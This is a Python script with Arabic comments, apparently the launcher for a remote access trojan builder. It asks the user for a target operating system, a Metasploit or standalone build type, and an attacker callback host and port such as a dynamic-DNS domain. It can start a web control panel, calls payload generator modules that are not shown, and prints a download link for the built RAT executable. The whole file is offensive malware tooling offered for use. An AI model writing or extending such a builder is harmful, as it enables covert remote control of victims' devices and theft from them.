import os
import sys

# ==============================
# تحميل ASCII Banner من ملف
# ==============================
def show_banner():
    with open("banner.txt", "r") as f:
        print(f.read())

# ==============================
# قائمة الأنظمة
# ==============================
def show_menu():
    print("enter target program:")
    print("1: windows")
    print("2: linux")
    print("3: android")
    print("4: mac'os")
    print("5: ios")

# ==============================
# اختيار النظام
# ==============================
def get_user_choice():
    while True:
        choice = input("enter name/number: ").strip().lower()
        if choice in ['1', 'windows']:
            return 'windows'
        elif choice in ['2', 'linux']:
            return 'linux'
        elif choice in ['3', 'android']:
            return 'android'
        elif choice in ['4', 'mac', 'macos']:
            return 'macos'
        elif choice in ['5', 'ios']:
            return 'ios'
        else:
            print("[-] خيار غير صحيح، حاول مجدداً.")

# ==============================
# نوع الإنشاء
# ==============================
def choose_generation_type():
    print("\n[*] هل تريد إنشاء RAT عبر Metasploit أم كود مستقل؟")
    print("1: Metasploit (msfvenom)")
    print("2: Standalone RAT")
    choice = input("اختر النوع [1/2]: ").strip()
    return "metasploit" if choice == "1" else "standalone"

# ==============================
# نوع الاتصال
# ==============================
def ask_connection_type():
    print("\n[*] نوع الاتصال:")
    print("1: داخلي (LAN)")
    print("2: خارجي (WAN / Internet)")
    choice = input("اختر النوع [1/2]: ").strip()
    if choice == "2":
        host = input("أدخل Host (مثل myserver.ddns.net): ").strip()
        port = input("أدخل Port (مثل 443): ").strip()
        return "wan", host, port
    else:
        return "lan", "127.0.0.1", "4444"

# ==============================
# استخدام لوحة تحكم ويب؟
# ==============================
def use_web_panel():
    choice = input("\n[*] هل تريد تفعيل لوحة تحكم ويب؟ (y/n): ").strip().lower()
    return choice == "y"

# ==============================
# نقطة الدخول
# ==============================
if __name__ == "__main__":
    show_banner()
    show_menu()
    selected_target = get_user_choice()

    gen_type = choose_generation_type()
    conn_type, host, port = ask_connection_type()

    if use_web_panel():
        from generator.webpanel import start_webpanel
        start_webpanel()

    if gen_type == "metasploit":
        from generator.metasploit import generate_metasploit_rat
        generate_metasploit_rat(selected_target, host, port)
    else:
        from generator.standalone import generate_standalone_rat
        generate_standalone_rat(selected_target, host, port)

    print("[+] تم إنشاء RAT بنجاح!")
    print(f"[+] الرابط المتاح: http://yourserver.com/rat/rat_{selected_target}.exe")